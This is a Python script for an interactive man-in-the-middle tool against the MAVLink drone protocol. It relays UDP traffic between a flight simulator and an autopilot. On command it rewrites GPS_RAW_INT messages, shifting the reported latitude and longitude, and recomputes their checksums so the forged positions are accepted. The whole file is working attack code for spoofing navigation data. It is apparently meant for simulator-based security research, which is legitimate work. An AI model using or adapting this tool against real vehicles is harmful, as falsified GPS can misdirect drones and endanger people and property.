#!/usr/bin/env python3

import os
import sys
import socket
import re
from threading import Thread
from struct import pack, unpack
from contextlib import contextmanager
from cmd import Cmd
from mavlinkdissector import message_crc, dissect_mavlink

@contextmanager
def quiet_out():
    with open(os.devnull, 'w') as devnull:
        oldout = sys.stdout
        sys.stdout = devnull
        try:
            yield
        finally:
            sys.stdout = oldout

class SimulatorProxy(Thread):

    def __init__(self, port: int, raddr: str):
        Thread.__init__(self)
        self.setName('SimProxy')
        self.__finish = False
        self.__sock = None
        self.__port = port
        self.__auto_addr = raddr
        self.__sim_addr = None
        self.__sim_port = None
        self.__auto = None
        self.__latitude = None
        self.__longitude = None
        self.__t_gps = False
    
    def __tamperGPS(self, message: dict) -> bytes :
        c_lat = message['payload']['lat'] + 10**4
        if c_lat > 900000000:
            c_lat = -899999999
        lat = [
            int(( c_lat & 0xff000000 ) / 0x1000000),
            int(( c_lat & 0x00ff0000 ) / 0x10000),
            int(( c_lat & 0x0000ff00 ) / 0x100),
            int(c_lat & 0x000000ff)
        ]
        c_lon = message['payload']['lon'] + 10**4
        print(
            'TAMPER:\tLAT {0:d}\tLON {1:d} -> LAT {2:d}\tLON {3:d}'.format(
                message['payload']['lat'],
                message['payload']['lon'],
                c_lat,
                c_lon
            )
        )
        if c_lon > 1800000000:
            c_lon = -1799999999
        lon = [
            int(( c_lon & 0xff000000 ) / 0x1000000),
            int(( c_lon & 0x00ff0000 ) / 0x10000),
            int(( c_lon & 0x0000ff00 ) / 0x100),
            int(c_lon & 0x000000ff)
        ]
        data = pack(
            '<BBBBBBBHQBBBBBBBBBiHHHhhhHB',
            message['length'],
            message['incompat_flags'],
            message['compat_flags'],
            message['sequence'],
            message['sysid'],
            message['compid'],
            113,
            0,
            message['payload']['time_usec'],
            message['payload']['fix_type'],
            lat[2],
            lat[3],
            lat[0],
            lat[1],
            lon[2],
            lon[3],
            lon[0],
            lon[1],
            message['payload']['alt'],
            message['payload']['eph'],
            message['payload']['epv'],
            message['payload']['vel'],
            message['payload']['vn'],
            message['payload']['ve'],
            message['payload']['vd'],
            message['payload']['cog'],
            message['payload']['satellites_visible']
        )
        crc = message_crc(data, 113)
        data = b'\xfd' + data + pack('<H',crc)
        return data

    def toggleTamperGPS(self):
        self.__t_gps = not self.__t_gps

    def setFinish(self):
        self.__finish = True

    def printCoord(self):
        msg = 'Current GPS:\tLAT {0:f}\tLON {1:f}'.format(self.__latitude, self.__longitude)
        print(msg)

    def recv(self, data):
        if self.__sock is not None and self.__sim_addr is not None:
            try:
                self.__sock.sendto(data, (self.__sim_addr, self.__sim_port))
            except IOError:
                sys.stderr.write('Simulator socket error\r\n')
    
    def run(self):
        self.__sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.__sock.bind(('0.0.0.0', self.__port))
        print('Awaiting connection from simulator ...')
        data, simaddr = self.__sock.recvfrom(4096)
        print('New simulator connected from {0:s}:{1:d}'.format(simaddr[0], simaddr[1]))
        print('Connecting to autopilot in {0:s} ...'.format(self.__auto_addr))
        self.__sim_addr = simaddr[0]
        self.__sim_port = simaddr[1]
        self.__auto = AutopilotProxy(self.__auto_addr, self.__port, self)
        self.__auto.write(data)
        self.__auto.start()
        while not self.__finish:
            buffer = self.__sock.recv(280)
            with quiet_out():
                message = dissect_mavlink(buffer)[0]
            if 'id' in message.keys() and message['id'] == 113:
                self.__latitude = float(message['payload']['lat'])/float(10**7)
                self.__longitude = float(message['payload']['lon'])/float(10**7)
                if not self.__t_gps:
                    self.__auto.write(buffer)
                else:
                    payload = self.__tamperGPS(message)
                    if payload is not None:
                        self.__auto.write(payload)
                    else:
                        self.__auto.write(buffer)
            else:
                self.__auto.write(buffer)
        #self.__sock.close()
        self.__sock = None
        self.__auto.setFinish()
        self.__auto.join()

class AutopilotProxy(Thread):

    def __init__(self, addr: str, port: int, parent: SimulatorProxy):
        Thread.__init__(self)
        self.setName('AutoProxy')
        self.__addr = addr
        self.__port = port
        self.__parent = parent
        self.__finish = False
        self.__sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    
    def setFinish(self):
        self.__finish = True

    def write(self, data: bytes):
        if self.__sock is not None:
            try:
                self.__sock.sendto(data, (self.__addr, self.__port))
            except IOError:
                sys.stderr.write('Autopilot socket error\r\n')
    
    def run(self):
        while not self.__finish:
            buffer = self.__sock.recv(280)
            self.__parent.recv(buffer)
        #self.__sock.close()
        self.__sock = None

class MitmPrompt(Cmd):

    START_REGEX = r'^(?P<ip_addr>(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)[.]){3}(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d))\s+(?P<port>(?:[1-9]\d{0,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5]))$'

    def __init__(self):
        Cmd.__init__(self)
        self.prompt = 'MAVLink MitM> '
        self.__proxy = None
    
    def emptyline(self):
        pass
    
    def do_start(self, args):
        s_info = re.match(self.START_REGEX, args)
        if s_info is not None:
            if self.__proxy is not None:
                self.__proxy.setFinish()
                self.__proxy.join()
                self.__proxy = None
            self.__proxy = SimulatorProxy(int(s_info.group('port')), s_info.group('ip_addr'))
            self.__proxy.start()
    
    def do_coordinates(self, args):
        if self.__proxy is not None:
            self.__proxy.printCoord()
    
    def do_tamper(self, args):
        self.__proxy.toggleTamperGPS()

    def do_exit(self, args):
        if self.__proxy is not None:
            self.__proxy.setFinish()
            self.__proxy.join()
        return True
    
    def do_EOF(self, args):
        sys.stdout.write('\r\n')
        return self.do_exit(None)

if __name__ == '__main__':
    try:
        mitm = MitmPrompt()
        mitm.cmdloop()
    except KeyboardInterrupt:
        sys.stdout.write('\r\n')
        mitm.do_exit(None)
